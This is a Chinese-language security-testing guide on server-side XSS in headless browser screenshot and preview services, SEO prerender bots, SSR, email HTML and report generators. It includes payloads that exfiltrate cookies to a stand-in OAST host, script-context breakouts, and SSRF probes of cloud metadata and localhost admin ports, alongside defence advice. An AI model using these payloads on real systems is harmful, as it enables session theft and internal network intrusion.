# 服务端 XSS 场景详解 — Headless Browser / SSR / Email HTML / 报告生成服务

> 关联文档：[README.md](README.md) · [PDF Injection](../PDF%20Injection/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) · [XSS](../../User%20input/Reflected%20Values/XSS/README.md) · [XSLT Server Side Injection](../../Proxies/XSLT%20Server%20Side%20Injection/README.md)

---

> 本文档是 Server Side XSS（Dynamic PDF）专题的配套扩展章节，展开动态 PDF 之外的服务端渲染攻击面：无头浏览器（截图 / 预览 / SEO Bot / 社交卡片）、SSR、Email HTML 渲染与报告生成服务。动态 PDF 场景的根因模型与利用链见 [README.md](README.md)，本文档只在其"攻击场景"分类上做纵深展开。

---

## 1. 统一定位：什么使 XSS 发生在服务端

### 1.1 与传统 XSS 的唯一差异

**传统 XSS（客户端 XSS）是攻击者注入的 HTML/JS 被"受害者的浏览器"解析执行；服务端 XSS（Server-Side XSS）是同一份注入被"服务端进程里的渲染器"解析执行。** payload 技术几乎相同，差异只在执行位置——因此判定一个场景是否为服务端 XSS，只问三个问题：

| # | 问题 | 决定什么 |
|---|------|---------|
| 1 | 攻击者控制的 HTML/数据在**哪里**被拼进页面？ | 注入点是否存在（用户名、任务标题、注释、文件名等"被信任数据"字段） |
| 2 | 拼好的 HTML 被**谁**处理？服务端渲染器，还是发回用户浏览器？ | 这是不是"服务端"XSS |
| 3 | 那个渲染器在网络**什么位置、持有什么凭据**？ | 打下来能拿到什么（战利品选择） |

### 1.2 渲染引擎能力光谱（最常见的误判来源）

不是所有"渲染 HTML"的引擎都能执行 JS。**先确认引擎，再选 payload**——把不执行 JS 的引擎当 XSS 打，是这类场景里最常见的空耗：

| 引擎类型 | 代表 | 执行 JS？ | 对攻击的含义 |
|---|---|---|---|
| 完整浏览器内核 | Puppeteer / Playwright / Selenium 驱动 Chromium；Electron；老 wkhtmltopdf（内置 WebKit） | ✅ 完整 DOM + JS | 真正的服务端 XSS |
| 轻量布局/截图引擎 | WeasyPrint、PrinceXML、satori / resvg（@vercel/og 类 og:image 生成器）、html-to-image 类 | ❌ 只做布局 | 无"XSS"，残余面只有 HTML 结构注入 + 资源引用（SSRF） |
| 服务端模板引擎 | handlebars / pug / nunjucks / mjml（邮件） | ❌ 不执行用户 JS | 输出的是 HTML 字符串，危害取决于下游谁再渲染它 |

两个衍生要点：

- **社交卡片不等于能打 XSS**：`@vercel/og` 生成的 og:image 根本不跑 JS，塞 `<script>` 毫无反应；同一"卡片"功能若用 headless Chrome 截图实现则能打。先查实现。
- **文件读取能力不通用**：现代 headless Chromium 沙箱下，远程页面默认禁止加载本地资源（`<iframe src=file:///etc/passwd>` 会被拒绝）；能读文件的是 wkhtmltopdf / 未沙箱化的老 Chrome / Electron 这类实现。现代引擎的通用战利品是 **SSRF**，不是文件读取。

### 1.3 "服务端"改变的是战利品，不是 payload

| 传统 XSS 的目标 | 服务端 XSS 的目标 |
|---|---|
| 偷用户会话 cookie | 打渲染器**能触达、而用户触达不到**的资源：127.0.0.1 本机端口、内网服务、云 metadata（169.254.169.254） |
| 冒充用户操作 | 若渲染器**持有身份**（如"生成我的账单"类会附带用户 cookie 的导出），则盗会话成立；但多数截图/预览 bot 是干净上下文，无 cookie 可偷 |
| 页面内容篡改/钓鱼 | 注入会随渲染产物传播：PDF/截图发给谁，谁看到钓鱼内容；报告/邮件批量放大 |

输出物形态决定盲不盲：**PDF/截图产物若回显给攻击者 → 不盲，产物像素就是回显通道**；产物去往别处（SEO bot、邮件收件人）→ 盲，只能外带。

## 2. 盲打方法论（无产物场景通用）

### 2.1 三段式探测序列

盲打的标准探测分三步，**每一步测一种能力**，不要把 `onerror` 和 `<script src>` 混为一谈——`<script src>` 本身就是一个出网请求，会被邮件网关、预览服务的预抓取逻辑污染，造成"JS 能执行"的误报：

```html
<!-- 1) 确认 HTML 被解析且渲染器能出网 -->
<img src="https://OAST.example/probe">

<!-- 2) 确认 JS 真的执行（与第 1 步分开测） -->
<img src=x onerror="fetch('https://OAST.example/js-ok')">
<svg/onload="fetch('https://OAST.example/js-ok2')">

<!-- 3) 确认网络位置 → SSRF 定向探测（云 metadata / 本机管理端口） -->
<img src=x onerror="fetch('http://169.254.169.254/latest/meta-data/')">
<img src=x onerror="fetch('http://127.0.0.1:8080/actuator')">
```

若第 1 步有回连、第 2 步没有 → 引擎不执行 JS，降级为资源级 SSRF（`<img src>`、`<link rel=stylesheet>`、`<iframe>` 引内网 URL 仍有探测价值）。

### 2.2 拿到 JS 执行后，按回显通道分流

| 场景 | 通道 | 手法 |
|---|---|---|
| 产物回显（截图/PDF 返回给攻击者） | 视觉外带 | 改写页面让产物把数据带回来；目标响应经 `<iframe>` 加载后连产物一起截图 |
| CORS 挡读（内网响应读不到） | oracle | `<script src>`/`<link>` 加载内网 URL，用 `onload`/`onerror` 判定状态码，逐位"问"出数据；或用请求耗时做时序 oracle |
| 无产物、纯盲 | 外带 | 经 DNS/HTTP 回连到 OAST 监听（Burp Collaborator / interactsh / Argus 类工具） |

```javascript
// 纯盲通道：结果 base64 后经图片请求外带
fetch('https://OAST.example/?d=' + btoa(JSON.stringify({c: document.cookie})))

// 产物回显通道：直接把内网响应写进页面（CORS 放行时），让截图把数据带回来
fetch('http://127.0.0.1:8080/internal').then(r => r.text())
  .then(t => { document.body.innerText = t })
```

```html
<!-- CORS 不放行时的 oracle：目标 200 与错误状态在 onload/onerror 上可区分 -->
<script src="http://127.0.0.1:9200/"></script>
```

## 3. Headless Browser 场景族：截图 / 预览 / SEO Bot / 社交卡片

共同执行模型：服务端起 headless Chrome（Playwright / Puppeteer / Selenium）→ 打开页面 → 等加载 → 截图或取 DOM。差异在**攻击者控制什么**，攻击面难度递增：

### 3.1 喂 URL 的截图/快照服务：先于 XSS 的 SSRF

典型形态：站点缩略图、网页快照、"导出为图片"、为链接生成预览图的内部工具。攻击者提交整个 URL。

此时不需要任何注入：直接提交 `http://127.0.0.1:8080/actuator` 或 `http://169.254.169.254/latest/meta-data/`。若产物（截图）返回给攻击者，这是**可视化 SSRF**——截图像素里直接写着内网页面内容，连数据外带都省了。若 bot 只抓标题/og 标签不回显图片（如"粘贴链接出卡片"），则退化为盲 SSRF，用回连判断。与 [README.md](README.md) 中"把读到的内容画进 PDF 产物"是同一类通道：产物本身可以做数据外带载体（参考 Portable Data exfiltration 研究，见参考资料）。

### 3.2 渲染"应用内页面"的预览/导出：真正的服务端 XSS 注入点

典型形态：编辑后预览（个人主页预览、海报生成器、发票模板、富文本预览）、"导出我的 X"。服务端把**用户或其他用户**的数据填进 HTML 模板 → headless 渲染 → 图片或 HTML 产物返回。

注入点是"会被渲染进预览页面"的数据字段。开发人员对数据字段的信任度与对 URL 参数的完全不同——"这不过是标题/用户名"，于是原样拼进模板：

```html
<!-- 模板侧（服务端） -->
<h1>{report_title}</h1>

<!-- report_title 提交值 -->
<img src=x onerror="fetch('https://OAST.example/pdf?d='+btoa(document.cookie))">
```

注入点启发：**凡被内部工具、导出功能、机器人查看的字段都可能成为入口**——用户名进了后台"登录尝试"审计页、任务标题进了导出报表、commit message 进了发布通知。登录审计页存用户名 → 后台查看时 payload 执行 → XHR 抓内网页面转发到监听器的链条，是此类场景的完整范式（案例见参考资料）。盲打时产物若回显（预览图、导出的 PDF/PNG），直接用 2.2 的视觉外带；产物不回显则走纯盲。

### 3.3 SEO Bot / prerender 服务：纯盲

形态：SPA 为 SEO 用无头浏览器把页面渲染成静态 HTML 喂搜索引擎爬虫；或站内"模拟爬虫 / 查看 Google 眼中的页面"调试工具。**渲染的正是自己站上的页面，产物不回攻击者 → 纯盲**。

推论：

- 站内任何存储型 XSS / HTML 注入会在服务端这个"伪爬虫"里自动触发——攻击者从"等真实用户访问"变成"渲染器自动送上门"；
- 真实搜索引擎爬虫不构成攻击面（不在你的内网）；攻击面是**应用自实现的爬虫**：SEO 预览工具、prerender 服务、sitemap 快照器；
- 战利品以 SSRF 为主（这类 bot 的网络位置必在内网），是否带会话视实现而定，默认按无会话处理。

### 3.4 社交卡片 / 链接 unfurl：先查引擎再动手

两类实现，攻击面完全不同：

| | A. 真浏览器抓取 | B. 布局引擎生成 og:image |
|---|---|---|
| 实现 | headless Chrome 抓链接出标题/缩略图（Slack/Discord 类产品的内部版） | @vercel/og / satori / resvg / imgproxy |
| 执行 JS | ✅ | ❌ |
| 攻击面 | 页面 JS 在服务端执行；bot 抓取**管理员粘贴的内网 URL** 本身就是 SSRF | 无 JS；残余面：图片/字体资源的服务端抓取（SSRF）、HTML 结构注入改卡片内容做钓鱼 |

进阶玩法：bot 抓管理员粘贴的内网链接、且自身带抓取身份时，被渲染的"内网页"里的存储型 XSS 会在**带身份的服务端浏览器**中执行，威力等同持有该身份。

微信/Telegram/Discord 官方 unfurl 是**外部**组件，不构成你的攻击面；但自家应用若有"为链接生成预览卡片"功能，威胁模型照 A/B 推。

### 3.5 Headless 家族判别速查

| 子场景 | 引擎 | 回显 | 注入方式 | 首选战利品 |
|---|---|---|---|---|
| URL 截图服务 | Chrome | 截图回显 | 无需注入，URL 直打 | 内网/metadata 可视化 |
| 页面预览/导出 | Chrome | 产物回显 | 数据字段 HTML/JS 注入 | 内网 SSRF、带身份渲染 |
| SEO Bot / prerender | Chrome | 无（盲） | 站内存储型 XSS | 内网 SSRF、渲染器身份 |
| 社交卡片 A（真浏览器） | Chrome | 视产物 | 链接内容、页面注入 | SSRF、带身份渲染 |
| 社交卡片 B（布局引擎） | satori 等 | 图片回显 | 无 JS，仅资源引用 | 有限 |

## 4. SSR（服务端渲染）

### 4.1 分类澄清：产物去用户浏览器，通常只是"生成方式在服务端"

SSR（Next.js / Nuxt / Angular Universal）在 Node 服务端把组件 `renderToString` 成 HTML 发给用户浏览器做水合。注入若只发生在"服务端往 HTML 写数据"这一步，最终仍由**用户浏览器**执行——那是普通反射/存储 XSS，不是服务端 XSS。真正构成服务端侧问题的只有下面两种形态。

### 4.2 形态一：服务端内联 JSON / script 上下文逃逸

SSR 要把状态传给前端水合，于是把数据序列化进 `<script>`（Next.js `__NEXT_DATA__`、Nuxt payload、自研 `window.__STATE__`）。服务端拼接用户输入进该 JSON 时若未转义 `</script>`，可逃出字符串直接注入：

```html
<!-- 服务端拼接（自研/写坏的序列化） -->
<script>window.__USER__ = {"name": "{{user_name}}"};</script>
```

```html
<!-- user_name 提交值：先闭合字符串与 script，再注入新脚本 -->
</script><script>fetch('https://OAST.example/?c='+document.cookie)</script>
```

现代框架默认已转义 `</script>`，漏洞常出在：**自定义内联 JSON、头像/富文本字段进 state、手写 `JSON.stringify` 后直接拼页面**。此类漏洞的"XSS 风味"是上下文逃逸发生在**服务端模板层**而非浏览器 DOM 层。

### 4.3 形态二：SSR 产物被下游服务端渲染器二次消费（闭环）

SSR 输出的 HTML 常不是终点：SEO prerender 缓存、截图/PDF 服务拿它出图、报表系统拿它做邮件正文、订阅功能发页面快照。于是：

```
用户输入 → SSR 模板逃逸 / HTML 注入 → SSR 产物
                                        ↓
                   下游服务端渲染器再消费（prerender / 截图 / PDF / 邮件）
                                        ↓
                              服务端 XSS（渲染器内执行）
```

SSR 层哪怕只是"输出未转义的富文本"（在用户浏览器里只是个存储 XSS），下游一旦挂着服务端渲染器，同一注入就升级为服务端 XSS。动态 PDF 场景也可换这个喂法：不注进 PDF 模板，而是注进一个"会被导出成 PDF"的页面——与 [README.md](README.md) 的 PDF 利用链闭环。

### 4.4 sink 清单与边界

- 绕过框架自动转义的 sink：React `dangerouslySetInnerHTML`、Vue `v-html`、Angular `[innerHTML]`；
- markdown/富文本渲染器放行原始 HTML（`<details open ontoggle>`、SVG 上传是此类存储型入口）→ 与渲染器是否沙箱化是同一个问题；
- 别跑偏：Next/Nuxt 平台自身的历史漏洞（中间件 RCE、图像优化 SSRF）是**框架漏洞**，不是本场景的 XSS 主面。

## 5. Email HTML 渲染

### 5.1 破除直觉：发送链路不渲染 HTML

往邮件模板里注入 `<script>`，**SMTP / 发送服务不渲染 HTML，JS 不会在发送服务器上执行**。"邮件 XSS"必须按渲染位置分层判定：

| 层 | 谁渲染 | 这是什么漏洞 | 真实危害 |
|---|---|---|---|
| 收件人客户端 | 用户的浏览器/邮件客户端 | 存储型 XSS 的邮件变体 | 现代客户端默认禁 JS、禁远程图 → 危害被高估；残余为 HTML 注入改版式/钓鱼内容、少数客户端 CSS 数据外带 |
| 服务端拼模板 | handlebars / nunjucks / mjml | 输入当**值** → HTML 注入；输入当**模板** → SSTI | HTML 注入被下游渲染器利用，或直接钓鱼；SSTI 属模板注入族（见 [XSLT Server Side Injection](../../Proxies/XSLT%20Server%20Side%20Injection/README.md) 的家族区分），已非 XSS |
| 链路中的服务端浏览器 | 邮件安全网关沙箱、归档服务截图、反钓鱼渲染分析、读邮件的内部机器人、订阅邮件的预览图 | **服务端 XSS** | 等同无头浏览器场景，按第 2 节方法论盲打 |

### 5.2 判断法

**别问"是不是邮件"，问 HTML 最终在哪被渲染。** 只到用户收件箱 → 归 HTML 注入/存储 XSS；链路中存在服务端渲染器（邮件系统常给每封邮件生成网页版归档/预览、或过沙箱渲染检测）→ 注入升级为服务端 XSS。

### 5.3 高价值变体：告警/工单邮件的"内部消费者"注入

告警邮件把触发条件里的**攻击者可控输入**拼进标题/正文（服务名、任务名、被监控页面 URL、工单标题），而消费方可能是内部系统——IM 机器人转发、工单自动归档、告警大屏渲染。这条内部链路是审计盲区，且注入来源常是低权限的"普通字段"，比直接攻邮件模板现实得多。周期任务（报表/心跳告警）会反复触发 payload，OAST 收到重复回连即可确认。

## 6. 报告生成服务

### 6.1 家族母体：数据 → 模板 → 渲染器 → PDF/PNG/HTML

报告生成与动态 PDF 是同一棵树的另一根枝（[PDF Injection](../PDF%20Injection/README.md) 可交叉参考）。单独列出的意义在于它的**注入点分布特征**：模板是开发写的（相对安全），**数据是脏的**——报表里渲染的字段值全部来自用户：

- 工单标题、用户名、注释；
- Git commit message（进发布/变更报告）；
- 告警内容、被监控 URL；
- 查询字段名/列名被直接用作表头；
- 文件名（导出文件带名字段拼进页面）。

渲染器五花八门：自研 headless Chrome、Grafana/Metabase/Jenkins 等带报表/通知功能的平台、老 WebKit 组件（wkhtmltopdf 家族——这类仍可文件读取，见 1.2 的能力光谱）。

### 6.2 实务特点

- **周期触发**：报表按小时/天批量生成 → payload 反复触发，重复回连即确认，无需等下一次周期；
- **产物常公开可下载/可查看** → 产物即回显通道，视觉外带最省事；
- **批量渲染放大**：一次注入随整批报表任务扩散，每个任务都是执行点。

## 7. 场景判别表与战利品选择

### 7.1 全场景判别表

| 场景 | 引擎 | 回显通道 | 典型注入点 | 首选战利品 |
|---|---|---|---|---|
| 动态 PDF（README 场景） | wkhtmltopdf / Chromium / PDFium | PDF 产物回显 | 导出页中的用户数据 | 文件读（老引擎）/ SSRF / 会话 |
| 截图/预览服务 | headless Chromium | 图片产物回显 | URL（直接 SSRF）；预览页数据（注入） | 内网/metadata 可视化 |
| SEO Bot / prerender | headless Chromium | 无（盲） | 站内存储型 XSS | 内网 SSRF、渲染器身份 |
| 社交卡片 A（真浏览器） | headless Chromium | 视产物 | 链接内容、页面注入 | SSRF、带身份渲染 |
| 社交卡片 B（布局引擎） | satori / resvg 等 | 图片回显 | 无 JS → 仅资源引用 | 有限 |
| SSR | 服务端序列化/模板 | 给用户浏览器 | 内联 JSON、v-html 类 sink | 常规 XSS；下游有渲染器才升级服务端 |
| Email HTML | 模板引擎 + 链路渲染器 | 无/视产物 | 模板字段、告警/工单内容 | 客户端（低）/ 链路渲染器（高） |
| 报告生成 | 各家 | 报表产物回显 | 报表字段值 | 同动态 PDF |

### 7.2 战利品优先级

1. **SSRF 优先**：云 metadata（`169.254.169.254`）→ 本机管理端口（80/8080/9200/3000/actuator 类）→ 内网已知服务。现代引擎沙箱禁 file:// 读取，SSRF 几乎总是可用；
2. 读内网响应被 CORS 挡 → 降级 oracle（2.2）；
3. 文件读取只在确认引擎能力后尝试（wkhtmltopdf / 未沙箱老 Chrome / Electron 类）；
4. 渲染器带身份时才打会话——**默认按无会话处理**，PDF 题的"附带用户 cookie"是特例而非常态。

## 8. 防御与缓解

### 8.1 渲染管道输入侧

- 转义发生在**模板层**而非 Web 层：任何数据进入 HTML/script/属性上下文前统一编码，富文本字段走白名单 + 沙箱（iframe/sanitizer），markdown 渲染禁用原始 HTML；
- 内部页面与外部页面同等对待：登录审计、导出页、报表模板里的"内部字段"一样转义——内部页面是盲 XSS 的主要落点。

### 8.2 渲染器运行侧

- 网络隔离：渲染器与业务网段分离，出站白名单，禁达云 metadata；
- 凭证最小化：不把用户会话塞进截图/预览 bot；确需身份的导出用短时只读令牌；
- 保持现代引擎 + 沙箱，禁止 `--no-sandbox`；生产环境禁用任意 URL 渲染（如需则限定协议与目标白名单）；
- 渲染超时与资源上限（防像素炸弹/资源耗尽）。

### 8.3 检测面

- 对渲染器的出站请求做日志与告警（OAST 回连特征：`onerror`、`onload` 探测、异常外连）；
- 报表/邮件产物抽查；盲 XSS payload 常见于注释、富文本、文件名字段，可针对性注入测试。

## 9. 一句话总结

**动态 PDF 之外的服务端 XSS 场景没有新 payload，只有新执行位置：先确认引擎是否执行 JS（截图 ≠ 可打 XSS，satori 类布局引擎没有 XSS 只有资源 SSRF），再确认产物是否回显（决定视觉外带还是纯盲外带），最后确认渲染器的网络与凭据位置（战利品从"偷 cookie"换成"SSRF 内网/metadata"，文件读取只属于 wkhtmltopdf 等老引擎）——其余检测与利用方法论全部复用第 2 节的盲打序列。**

## 参考资料

- [PortSwigger Research — Portable Data exFiltration: XSS for PDFs](https://portswigger.net/research/portable-data-exfiltration)
- [PortSwigger — Cross-site scripting（XSS 分类与上下文基础）](https://portswigger.net/web-security/cross-site-scripting)
- [Bug Bounty Bootcamp #39 — PDF SSRF and Blind Exfiltration: When Headless Browsers Become Your Data（盲外带链条）](https://infosecwriteups.com/bug-bounty-bootcamp-39-pdf-ssrf-and-blind-exfiltration-when-headless-browsers-become-your-data-507d6543d167)
- [XBOW — Blind SSRF 转文件读取 oracle 的逐位外带思路](https://xbow.com/blog/xbow-titiler-lfi)
- [Bug Bounty Hunter — Blind Stored XSS on admin panel can lead to SSRF（内部字段注入点范式）](https://www.bugbountyhunter.com/hackevents/report?id=1559)
- [Argus — 盲 XSS / SSRF OOB 监听工具](https://github.com/0xRahim/Argus)
